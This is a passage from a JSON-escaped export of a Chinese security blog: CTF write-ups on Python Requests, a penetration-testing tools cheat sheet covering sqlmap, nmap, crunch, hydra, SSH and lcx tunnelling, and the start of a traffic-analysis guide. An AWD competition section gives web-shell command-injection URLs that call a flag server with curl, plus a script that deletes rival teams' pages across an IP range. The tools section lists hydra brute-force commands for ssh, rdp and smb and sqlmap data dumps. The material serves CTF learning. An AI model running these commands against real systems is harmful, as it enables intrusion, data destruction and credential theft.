正则表达式\nurl=\"http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php\"\ns=requests.Session()\nr=s.get(url).content\nexpression=re.search(r'[0-9+*()]+[)]',r).group()\nsum=eval(expression) \npostdata={'v':sum}\nprint(s.post(url,data=postdata).content.decode('utf-8'))\n```\n`0-9+`代表一个或多个数字\n`+*()`匹配一个加号，或一个乘号，或一个括号\n`[0-9+*()]+`代表一个或多个由数字与运算符组成的匹配组；最后再加上剩下的一个后括号`[)]`\n运行脚本，得到flag\n![](https://i.loli.net/2020/05/20/jt2ZiEkPbwLaJnQ.png)\n\n### 题目 cookies欺骗\n题目来源：bugku\n题目链接：http://123.206.87.240:8002/web11/\n题目信息：\n![](https://i.loli.net/2019/08/09/IVY2q6SJ1inOBFk.png)\n打开题目，看到一段字符，各种编码尝试之后，未果。。。\n![](https://i.loli.net/2019/08/09/8wUNGWz74yhjJPs.png)\n发现`url`中的`filename`的值`a2V5cy50eHQ=`是`base64`编码，解码后是`keys.txt`\n直接访问`keys.txt`，发现回显的就是刚才的那段字符\n![](https://i.loli.net/2019/08/09/VYSfsa2lenBJF6K.png)\n也就是说`filename`能读取文件，但是文件名要`base64`编码\n因此我们来读取`index.php`,将其`base64`编码\n![](https://i.loli.net/2019/08/09/Wgu2X9LFCel6vxp.png)\n`url`中`line`参数应该是行数，试一下`line=1`\n![](https://i.loli.net/2019/08/09/sLUrDAydSgMOlkJ.png)\n出现一行代码，再试一下`line=2`显示了不同的代码\n![](https://i.loli.net/2019/08/09/QxzrbNmg5GtvwCk.png)\n由此推断改变`line`值就能够读取`index.php`,但是手动改太麻烦，因此我们写一个脚本来读取`index.php`\n\n```python\nimport requests\n\nfor i in range(0,30):\n\turl='http://123.206.87.240:8002/web11/index.php?line='+str(i)+'&filename=aW5kZXgucGhw'\n\tr=requests.get(url)\n\tprint r.text\n```\n运行脚本得到源码\n![](https://i.loli.net/2019/08/09/IrajzObsk7SQYug.png)\n审计代码，`cookie`必须满足`margin=margin`才能访问`keys.php`\n将`keys.php`进行`base64`编码\n![](https://i.loli.net/2019/08/09/Qxb7LsPZkREtYyO.png)\n抓包之后，加上`Cookie:margin=margin`\n![](https://i.loli.net/2019/08/09/Lo1i7BAJFNlU9bg.png)\n看了网上也可用Hackbar,执行之后查看源码\n![](https://i.loli.net/2019/08/09/CkLSp8PODf3ztnv.png)\n\n## Request在AWD中实战\n### 题目：JEECMS\n\n题目来源：2019四川省省赛AWD\n题目链接：链接：https://pan.baidu.com/s/1YpdKs8BwQpUuCosqNM_-9w \n提取码：kg4y \n\nssh连接，将源码down下来，D盾扫描\n![](https://blog.xiafeng2333.top/content/images/2019/08/1.jpg)\n一共四个木马，两个多功能大马\n![](https://i.loli.net/2020/05/20/YVCpkEZtAbcIRQ3.png)\n根据扫出的命令执行漏洞，直接获取flag手工提交\n\n```php\nhttp://192.200.1.11:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/\nhttp://192.200.1.12:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/\nhttp://192.200.1.num:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/\n# 题目提供的flag所在地 curl http://192.200.0.70/remoteflag/\n```\n根据漏洞，利用Requests写出宕机脚本，直接删除敌方页面\n```python\nimport requests\n\nfor num in range(11,43):  #这个范围是打的ip是11-43的队伍\n\t#修改要删除页面的权限\n    url='http://192.200.1.'+str(num)+':8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=chmod 777 /home/ctf/apache-tomcat-7.0.79/webapps/jeecmsv9f/jeeadmin/jeecms/index.do'\n\n    r = requests.get(url,timeout=5)\n\t#删除页面\n    url='http://192.200.1.'+str(num)+':8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=rm%20/home/ctf/apache-tomcat-7.0.79/webapps/jeecmsv9f/jeeadmin/jeecms/index.do'\n\n    r = requests.get(url,timeout=5)\n\n    print('\\n')\n\n    url='http://192.200.1.'+str(num)+':8080/jeeadmin/jeecms/index.do'\n\n    print('\\n')\n\n    print(r.text)\n```\n参考：\n[快速上手-Requests](https://requests.readthedocs.io/zh_CN/latest/)\n[高级用法-Requests](https://requests.readthedocs.io/zh_CN/latest/user/advanced.html)\n[详解CTF Web中的快速反弹POST请求](https://ciphersaw.me/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/)\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["Requests"],"categories":["CTF"]},{"title":"渗透测试-工具篇","url":"/posts/49445.html","content":"![](https://img.jwt1399.top//img/20200824182154.jpg)\n\n## dirsearch-网站目录结构扫描器\n\n> dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。\n\n### 安装与使用\n\n```bash\n#安装：\ngit clone https://github.com/maurosoria/dirsearch.git\n\n#使用：\ncd dirsearch/\n#运行需要python3环境：\npython3 dirsearch.py -u \"http://localhost/\" -e *     \n# 扫描网站需要指定网站的脚本类型，* 为全部类型的脚本\n```\n### 用法示例\n\n![](https://i.loli.net/2020/04/13/pjJrQLVi6mahPtU.png)\n**扫描结果**\n扫描时间，状态码，大小，扫描的目录，重定向的地址\n\n![](https://i.loli.net/2020/04/13/IgUMdAiuc7HWs4n.png)\n\n## GitHack -一个git泄露利用脚本\n\n> GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。\n\n当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。\n\nGit信息泄露的危害很大，渗透测试人员、攻击者，可直接从源码获取敏感配置信息（如：邮箱，数据库），也可以进一步审计代码，挖掘文件上传、SQL注射等安全漏洞。\n\n### 安装与使用\n\n**下载地址**:\n版本1：https://github.com/lijiejie/GitHack  从 `.git` 文件夹重建源代码，同时保持目录结构不变。\n\n版本2：https://github.com/BugScanTeam/GitHack  `.git` 泄漏利用工具，可还原历史版本\n\n**使用**：\n\n```bash\n# 1. 切换到GitHack的路径下\ncd GitHack-master\n# 2.执行py脚本\n python GitHack.py http://111.198.29.45:57559/.git/\n```\n\n**脚本的工作原理:**\n\n ```\n1. 解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )\n2. 去.git/objects/ 文件夹下下载对应的文件\n3. 使用zlib解压文件，按原始的目录结构写入源代码\n ```\n**优点:**\n\n```\n1. 速度快，默认20个工作线程\n2. 尽量还原所有的源代码，缺失一部分文件不影响脚本工作\n3. 脚本不需要执行额外的git命令，有python就够了\n```\n\n### 用法示例\n\n`此例子为攻防世界-web-mfw`\n\n![](https://i.loli.net/2020/04/13/KpZ53WvtsnzBSld.png) \n\n重建的工程源代码在GitHack文件夹中\n\n![](https://i.loli.net/2020/04/13/uDRkOJqKtEQibTU.png)\n\n\n参考：[https://www.secpulse.com/archives/6275.html](https://www.secpulse.com/archives/6275.html)\n\n## .DS_Store-文件泄漏利用脚本\n\n> .DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。\n\n### 安装\n\n```bash\n#安装：\ngit clone https://github.com/lijiejie/ds_store_exp.git\npip install -r requirements.txt\n\n#使用：\ncd \\A-CTFtools\\脚本\\Web\\ds_store_exp-master   #切换到你安装的路径下\n运行需要python2环境：\npython ds_store_exp.py http://www.example.com/.DS_Store\n```\n### 用法示例\n\n `此例子为bugku-sql注入2`\n通过扫描发现`.DS_Store`文件泄露\n![](https://i.loli.net/2020/04/13/KP4pwMbSRr968Dj.png)\n使用脚本查看`.DS_Store`文件\n![](https://i.loli.net/2020/04/13/MU2Hk7wQlmEOGzZ.png)\n访问发现的路径得到flag\n\n## dvcs-ripper-版本控制软件信息泄露利用工具\n\n> 一款perl的版本控制软件信息泄露利用工具，支持SVN, GIT, Mercurial/hg, bzr… git泄露推荐使用Githack，功能更强\n\n### 安装\n\n```\nsudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl\n\nsudo apt-get install libparallel-forkmanager-perl libredis-perl libalgorithm-combinatorics-perl\n\nsudo apt-get install cvs subversion git bzr mercurial\n\ngit clone https://github.com/kost/dvcs-ripper\n```\n\n### 用法示例\n\n```bash\n# 1. 切换到dvcs-ripper的路径下\ncd dvcs-ripper\n\n# 2.执行脚本\n#SVN\nperl rip-svn.pl -v -u http://www.example.com/.svn/\n\n#HG\nperl rip-hg.pl -v -u http://www.example.com/.hg/\n\n#Git\nperl rip-git.pl -v -u http://www.example.com/.git/\n\n#bzr\nperl rip-bzr.pl -v -u http://www.example.com/.bzr/\n\n#CVS\nperl rip-cvs.pl -v -u http://www.example.com/CVS/\n```\n\n`此例子为CTFHub-SVN泄露`\n\n```bash\n# 1. 切换到dvcs-ripper的路径下\ncd dvcs-ripper\n\n# 2.执行perl脚本\nperl rip-svn.pl -v -u http://challenge-8df627014df49067.sandbox.ctfhub.com:10080/.svn/\n```\n\n![](https://img.jwt1399.top//img/20200716193721.png)\n\n3.进入`.svn/pristine/`文件夹下， 在`bf`文件夹下发现`xxx.svn-base`源码文件，查看得到flag\n\n![](https://img.jwt1399.top//img/20200716193224.png)\n\n## SQLmap-自动SQL注入工具\n\n> SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。\n\n### 安装\n\n**windows安装方法：**[Windows下sqlmap的安装图解](https://www.cnblogs.com/jackzz/p/10894089.html)\n\n**Linux安装方法:**\n\n```bash\nwget https://codeload.github.com/sqlmapproject/sqlmap/legacy.tar.gz/master #下载sqlmap\ntar zxvf master  #解压压缩包\ncd sqlmapproject-sqlmap-310d79b/   #进入解压目录\npython sqlmap.py -h  #开始使用\n```\n\n### 用法示例\n\n(1) 猜解是否能注入\n\n```bash\nwin: python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 \n\nkali: sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1\n```\n\n(2) 查找数据库\n```bash\nwin:python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --dbs   # ?id=1 --current-db(当前数据库)\n\nkali: sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --dbs\n```\n(3) 猜解表(假如通过(2)得到了web1这个数据库)\n```bash\nwin: python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1  --tables -D web1\n\nkali: sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tables -D web1\n```\n\n\n(4) 根据猜解的表进行猜解表的字段(假如通过(3)得到了flag这个表)\n```bash\nwin: python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --columns -T flag -D web1\n\nkali: sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --columns -T flag -D web1\n```\n\n\n(5) 根据字段猜解内容(假如通过(4)得到字段为username和password)\n```bash\nwin: python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --dump -C \"username,password\" -T flag -D web1\n\nkali: sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --dump -C \"username,password\" -T flag -D web1\n```\n\n\nTarget（目标）：\n以下至少需要设置其中一个选项，设置目标URL。\n```bash\n    -d (DIRECT) 直接连接到数据库。\n    -u (URL), –url=URL 目标URL。\n    -l (LIST) 从Burp或WebScarab代理的日志中解析目标。\n    -r (REQUESTFILE) 从一个文件中载入HTTP请求。\n    -g （GOOGLEDORK) 处理Google dork的结果作为目标URL。\n    -c (CONFIGFILE) 从INI配置文件中加载选项。\n```\n**Enumeration（枚举）：**\n这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。\n\n```bash\n--tamper=space2comment 绕过空格 （--tamper=space2comment --dbs）\n-a 检索所有内容\n-b, –banner 检索数据库管理系统的标识\n-D (DBname) 枚举的指定数据库名中信息\n-T (TBLname) 枚举的指定数据库表中信息（eg：-T tablename –columns）\n-C (COL ) 枚举的指定数据库字段(列)信息 (eg：-C flag -T flag -D web1 <---> -C 字段名 -T 表名 -D 数据库名)\n-U (USER) 用来进行枚举的数据库用户\n--dbs 扫描数据库信息\n--tables 列出数据库所有的表信息\n--columns 列出数据库表中的所有字段信息(表列)\n--current-db 列出当前的数据库名称\n-current-user 检索数据库管理系统当前用户\n--roles 枚举用户\n-dump 列出数据库中表的字段名中信息\n--dump-all 列所有表的内容\n--exclude-sysdbs 列举用户数据库的表内容\n--common-tables暴力破解表\n-is-dba 检测DBMS当前用户是否DBA\n-users 枚举数据库管理系统用户\n-passwords 枚举数据库管理系统用户密码哈希\n-privileges 枚举数据库管理系统用户的权限\n-columns 枚举DBMS数据库表列-dump 转储数据库管理系统的数据库中的表项\n-search 搜索列（S），表（S）和/或数据库名称（S）\n-start=LIMITSTART 第一个查询输出进入检索\n-stop=LIMITSTOP 最后查询的输出进入检索\n-first=FIRSTCHAR 第一个查询输出字的字符检索\n-last=LASTCHAR 最后查询的输出字字符检索\n-sql-query=QUERY 要执行的SQL语句\n-sql-shell 提示交互式SQL的shell\n```\n\n更多参考我另一篇文章：https://www.jianshu.com/p/a46abd1e67aa\n\n## Nmap-网络扫描工具\n\n### 简介\n\n>nmap(Network Mapper)是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。\n\n### 核心功能\n\n1.1\t主机发现\n1.2\t端口扫描\n1.3\t版本侦测\n1.4\t操作系统侦测\n1.5\t防火墙/IDS规避和哄骗\n1.6\tNSE脚本引擎\n\n### 基本命令和典型用法\nNmap 基本语法\n```\nnmap [ <扫描类型> ...] [ <选项> ] { <扫描目标说明> }\n```\n全面进攻性扫描（包括各种主机发现、端口扫描、版本扫描、OS扫描及默认脚本扫描）:\n```\nnmap -A -v target_ip\n```\nPing扫描:\n```\nnmap -sn -v target_ip\n```\n快速端口扫描:\n```\nnmap -F -v target_ip\n```\n版本扫描:\n```\nnmap -sV -v target_ip \n```\n操作系统扫描:\n```\nnmap -O -v target_ip\n```\n### 常用命令\n\n```\nnmap -p 0-65535  target_ip   #扫描端口\nnmap -sV  target_ip          #扫描端口和对应服务\nnmap -sP  network_segment    #扫描网络存活主机\nnmap -O   target_ip          #扫描操作系统\nnmap -sS -sV --script=xxx.nse target_ip  #使用脚本扫描漏洞\nnmap -iR 10  -p 3306  随机生成10个互联网上的IP，从中找出mysql服务器。\n```\n\n\n\n### 详细用法\n\n[不老的神器：安全扫描器Nmap渗透使用指南](https://www.freebuf.com/news/141607.html)\n[nmap的常用命令表](https://www.uedbox.com/post/54108/)\n\n![](https://i.loli.net/2019/08/06/bNBTEDpo485wjfa.png)\n\n## AWVS-漏洞扫描工具\n\n> Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。AWVS可以检查SQL注入漏洞，也可以检查跨站脚本攻击漏洞，可以扫描任何可以通过web浏览访问和遵循HTTP/HTTPS规则的web站点和web应用程序。\n\n官网地址：https://www.acunetix.com/vulnerability-scanner/\n\n[AWVS安装与使用](https://blog.csdn.net/Fly_hps/article/details/99620560)\n\n[acunetix_WVS 13.基础使用](https://blog.csdn.net/qq_41901122/article/details/104757589?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase)\n\n## Crunch-字典生成工具\n\n> Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。\n\n### 语法和参数\n\n```bash\ncrunch <min> <max> [options] [<charset string>]\n\n#参数详解\n     min    设定最小字符串长度（必选）\n     max    设定最大字符串长度（必选）\n\t <charset string>   指定字符集设置\n\t  \n     oprions\n     -b     指定文件输出的大小，避免字典文件过大  \n     -c     指定文件输出的行数，即包含密码的个数\n     -d     限制相同元素出现的次数\n     -e     定义停止字符，即到该字符串就停止生成\n     -f     调用库文件（/etc/share/crunch/charset.lst）\n     -i     改变输出格式，即aaa,aab -> aaa,baa\n     -I     通常与-t联合使用，表明该字符为实义字符\n     -m     通常与-p搭配\n     -o     将密码保存到指定文件\n     -p     指定元素以组合的方式进行\n     -q     读取密码文件，即读取pass.txt\n     -r     定义重某一字符串重新开始\n     -s     指定一个开始的字符，即从自己定义的密码xxxx开始\n     -t     指定密码输出的格式\n     -u     禁止打印百分比（必须为最后一个选项）\n     -z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z  \n```\n\n### 用法示例\n\n```bash\nroot@kali:~# crunch -h\n\n#生成最小为1 ，最大为8位，全部由字母组成\nroot@kali:~#crunch 1 8  \n\n#生成最小为1 ，最大为2位，全部由abc组成\nroot@kali:~# crunch 1 2 abc  \n\n#生成最小为1 ，最大为6位，全部由abc和空格组成\nroot@kali:~# crunch 1 6 ab\\  \n\n#生成最小为1 最大为8 调用系统里面的元素密码库中的mixalpha-numeric-all-space,并保存为wordlist.txt文件\nroot@kali:~#crunch 1 8 -f /usr /crunch arset.lst mixalpha-numeric-all-space -o wordlist.txt\n\n#调用系统里面的元素密码库中的mixalpha-numeric-all-space这一项 生成8位密码，生成格式“两个小写字母+dog+两个小写字母\"，并以cbdog开头。\nroot@kali:~# crunch 8 8 -f /usr /crunch arset.lst  mixalpha-numeric-all-space -o wordlist.txt -t @@dog@@@ -s cbdog\n\n#调用系统里面的元素密码库中的ualpha这一项。生成2-3位密码，并以BB开头 -s 以什么为开头\nroot@kali:~#crunch 2 3 -f /usr /crunch arset.lst ualpha -s BB\n\n\n#生成   但是前面无论数字是多少，但是必须要有。\nroot@kali:~# crunch 5 5 -p abc \nabc\nacb\n\n#生成   但是前面无论数字是多少，但是必须要有。\nroot@kali:~#crunch 4 5 -p dog cat bird\nbirdcatdog, birddogcat, catbirddog, catdogbird, dogbirdcat, dogcatbird.\n\n#生成最小为1位最大为5位所有小定字母的密码字典，其中每个文件包含6000个密码，并将密码文件保存为bz2文件.输出文件格式为first_word-last_word.txt.bz2\nroot@kali:~#crunch 1 5 -o START -c 6000 -z bzip2\n\n#生成 aaaa-gvfed.txt, gvfee-ombqy.txt, ombqz-wcydt.txt, wcydu-zzzzz.txt  每个文件大小为20M\nroot@kali:~#  crunch 4 5 -b 20mib -o START\n\n\n#生成4位密码，其中密码格式为”两个数字“+一个小字母+常规符号（其中数字这里被指123组成的所有2位排列组合）。\nroot@kali:~#crunch 4 4  + + 123 + -t %%@^\n\n\n#生成5个无素组成密码，其中前三个为dog cat bird排列组合，后面两个为小写字母。\nroot@kali:~# crunch 5 5 -t ddd@@ -o j -p dog cat bird\n\n\n#生成7位密码 格式”p@ss+大写字母+数字+常规字符“   -l 中@对-t里面的@进行了转义\nroot@kali:~#crunch 7 7 -t p@ss,%^ -l a@aaaaa\n\n#生成密码为5位，格式为”3个字母+三个数字。“ -d 2@ 限制每个密码最少出现2种字母.\nroot@kali:~#crunch 5 5 -d 2@ -t @@@%%\n\n#生成密码为10位 ，格式”三个小字母+一个常规符号+4个数字+两个常规符号“ ，限制每个密码至少2种小写字母和至少三个数字。并且每个文件为20M，文件名为START的格式。\nroot@kali:~# crunch 10 10 -t @@@^%%%%^^ -d 2@ -d 3% -b 20mb -o START  \n\n\n#生成8位密码，每个密码至少出现2种字母。\nroot@kali:~# crunch 8 8 -d 2@ \n\n```\n\n## Hydra-暴力密码破解工具\n\n### 语法和参数\n\n```bash\nhydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]\n[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]\n\n-R 继续从上一次进度接着破解。\n-S 采用SSL链接。\n-s PORT 可通过这个参数指定非默认端口。\n-l LOGIN 指定破解的用户，对特定用户破解。\n-L FILE 指定用户名字典。\n-p PASS 小写，指定密码破解，少用，一般是采用密码字典。\n-P FILE 大写，指定密码字典。\n-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。\n-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。\n-M FILE 指定目标列表文件一行一条。\n-o FILE 指定结果输出文件。\n-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。\n-t TASKS 同时运行的线程数，默认为16。\n-w TIME 设置最大超时的时间，单位秒，默认是30s。\n-v / -V 显示详细过程。\nserver 目标ip\nservice 指定服务名\n```\n\n### 破解ssh\n\n```bash\nhydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh\nhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh\n```\n\n### 破解ftp\n\n```bash\nhydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV\nhydra ip ftp -l 用户名 -P 密码字典 -e ns -vV\n```\n\n### get方式提交，破解web登录\n\n```bash\nhydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/\nhydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php\n```\n\n### post方式提交，破解web登录\n\n```bash\n\nhydra -l 用户名 -P 密码字典 -s 80 ip http-post-form \"/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password\"\n\nhydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form \"login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>\"\n\n（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）\n```\n\n### 破解https\n\n```bash\nhydra -m /index.php -l muts -P pass.txt 10.36.16.18 https\n```\n\n### 破解teamspeak\n\n```bash\n\nhydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak\n```\n\n### 破解cisco\n\n```bash\nhydra -P pass.txt 10.36.16.18 cisco\nhydra -m cloud -P pass.txt 10.36.16.18 cisco-enable\n```\n\n### 破解smb\n\n```bash\nhydra -l administrator -P pass.txt 10.36.16.18 smb\n```\n\n### 破解pop3\n\n```bash\nhydra -l muts -P pass.txt my.pop3.mail pop3\n```\n\n### 破解rdp\n\n```bash\nhydra ip rdp -l administrator -P pass.txt -V\n```\n\n### 破解http-proxy\n\n```bash\nhydra -l admin -P pass.txt http-proxy://10.36.16.18\n```\n\n### 破解imap\n\n```bash\nhydra -L user.txt -p secret 10.36.16.18 imap PLAIN\nhydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN\n```\n\n详细请看：[（总结）Linux下的暴力密码在线破解工具Hydra详解](http://www.ha97.com/5186.html)\n\n## curl-命令行文件传输工具\n\n### 用法示例\n\n```bash\n#不带有任何参数时，curl 就是发出 GET 请求。\ncurl https://www.example.com\n\n#-A参数指定客户端的用户代理标头，即User-Agent\ncurl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com\n\n#-b参数用来向服务器发送 Cookie。\ncurl -b 'foo1=bar;foo2=bar2' https://google.com\n\n#-d参数用于发送 POST 请求的数据体。\n$ curl -d 'login=emma＆password=123'-X POST https://google.com/login\n# 或者\n$ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login\n\n#-e参数用来设置 HTTP 的标头Referer -H参数可以通过直接添加标头Referer达到同样效果。\ncurl -e 'https://google.com?q=example' https://www.example.com\n或者\ncurl -H 'Referer: https://google.com?q=example' https://www.example.com\n\n#-H参数添加 HTTP 请求的标头。\ncurl -H 'Accept-Language: en-US' -H 'Content-Type: application/json' https://google.com\n\n#-i参数打印出服务器回应的 HTTP 标头\ncurl -i https://www.example.com\n\n#-u参数用来设置服务器认证的用户名和密码。\ncurl -u 'bob:12345' https://google.com/login\n\n#-v参数输出通信的整个过程，用于调试。\ncurl -v https://www.example.com\n\n#-X参数指定 HTTP 请求的方法。\ncurl -X POST https://www.example.com\n```\n\n更多详细请看：[curl 的用法指南](http://www.ruanyifeng.com/blog/2019/09/curl-reference.html)\n\n## SSH端口转发\n\n### 基础知识\n\n**端口转发前服务器必须做如下配置：**\n\n```bash\n#1.允许任何人连接到转发的端口\nvim /etc/ssh/sshd_config\n将#GatewayPorts no 修改为 GatewayPorts yes\n\n#2.重启ssh服务\nservice sshd restart\n或者\nsystemctl restart sshd\n```\n\n **SSH语法：**\n\n```bash\nssh [options] [-l login_name][user@]hostname [command]\n```\n\n**创建SSH隧道的常用参数如下：**\n\n```bash\n-C：压缩数据传输\n-f：将SSH传输转入后台执行，不占当前的Shell,通常和-N连用\n-N：只希望建立隧道，而不会在远程主机上执行任何指令\n-T：只希望建立隧道，因而不需要创建虚拟终端\n-g：允许远程主机连接本地用于转发的端口\n-L：本地端口转发\n-R：远程端口转发\n-D：动态转发\n-P：指定SSH端口\n-q 安静模式，不输出错误/警告信息\n```\n\n### 本地端口转发\n\n构成条件：本地网无法访问私网，本地网可以访问云服务器，云服务器可以访问私网\n\n![本地端口转发](https://img.jwt1399.top//img/20200906105347.png)\n\n**将本地机的某个端口转发到远端目标机器的指定端口：**\n\n```bash\nssh  -CfNg -L 本地IP:本地port:私网IP:私网port 服务器用户名@服务器IP\n```\n\n**实例**\n\n> **场景描述：**云服务器上有一个Web服务，端口8080，但是安全组没有开放8080端口，因此本地无法访问该服务，怎样才能让本地访问到Web服务呢？\n\n首先确保服务器进行了前面的端口转发前配置(打开GatewayPorts)，然后执行下方命令\n```bash\nssh  -CfNg -L 192.168.137.1:8088:localhost:8080 root@139.224.112.182\n```\n\n运行命令，输入密码后，本地访问 `192.168.137.1:8088`或者 `localhost:8088`就可以访问到云服务器的 Web 服务\n\n### 远程端口转发\n\n构成条件：本地网无法访问私网，本地网可以访问云服务器，私网也可以访问云服务器\n\n![远程端口转发](https://img.jwt1399.top//img/20200906105357.png)\n\n**将远程主机(服务器)的某个端口转发到目标机器的指定端口：**\n\n```bash\nssh  -CfNg -R 远程IP:服务器port:内网IP:内网port  服务器用户名@服务器IP\n```\n\n**实例**\n\n> **场景描述：**本地主机运行了一个Web服务，端口为80，怎么让其他人也能访问这个Web服务？\n\n首先确保服务器进行了前面的端口转发前配置(打开GatewayPorts)，然后服务器安全组打开8088端口，然后执行下方命令\n\n```bash\nssh -CfNg -R 0.0.0.0:8088:192.168.137.1:80 root@139.224.112.182\n\n# 0.0.0.0表示vps上监听所有地址，即所有人可访问\n```\n\n运行命令，输入密码后，其他人访问 `139.224.112.182:8088` 就可以访问到我本地的 Web 服务了\n\n**其他相关命令:**\n\n```bash\nnetstat -anp|grep 8088 #检验端口的网络连接情况\nkillall ssh #终止ssh所有进程\n```\n\n参考：\n\n[最佳搭档：利用正反 SSH 隧道穿透防火墙访问内网服务器](https://liam.page/2018/04/11/break-firewall-by-the-use-of-SSH-tunnel/)\n\n[玩转SSH端口转发](https://zhuanlan.zhihu.com/p/26547381)\n\n[B站SSH端口转发](https://www.bilibili.com/video/BV1C7411P7Er?p=1)\n\n## lcx端口转发\n\n> lcx是一款强大的内网端口转发工具，用于将内网主机开放的内部端口映射到外网主机（有公网IP）任意端口。Windows版是lcx.exe,Linux版为portmap\n\n\n\n```bash\n内网端口转发：\nlcx.exe -slave vps 3333 127.0.0.1 3389\nlcx.exe -listen 3333 4444\n本地端口转发：\nlcx.exe -tran 21 主机IP 3389 #将3389端口转发到其他端口\n```\n\n","tags":["渗透测试"],"categories":["Tools"]},{"title":"CTF-流量分析总结","url":"/posts/29176.html","content":"在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的`pcap`文件，选手通过该文件筛选和过滤其中无关的流量信息，根据关键流量信息找出flag或者相关线索,一般flag隐藏在某个数据包里面，或者需要从中提取一个文件出来等等，还有wifi的握手包，需要获取wifi密码等。\n\n## 附件下载\n\n本文章涉及的所有题目附件下载地址：\n链接：https://pan.baidu.com/s/18mWo5vn1zp_XbmcQrMOKRA \n提取码：hrc4 \n\n## Wireshark的使用\n\n下载地址：https://www.wireshark.org/download.html\n`pcap流量包`的分析通常是通过图形化的网络嗅探器——`Wireshark`进行的.\nWireshark的基本使用分为数据包筛选、数据包搜索、数据包还原、数据提取四个部分。\n\n### 数据包筛选\n#### 筛选ip\n\n>源ip筛选\n\n**方法一：**\n\n```\nip.src == 源ip地址\n```\n![](https://img.jwt1399.top//img/20201230113252.png)\n\n**方法二：**\n选中一个源IP是筛选条件的数据包，找到`Internet Protocol Version 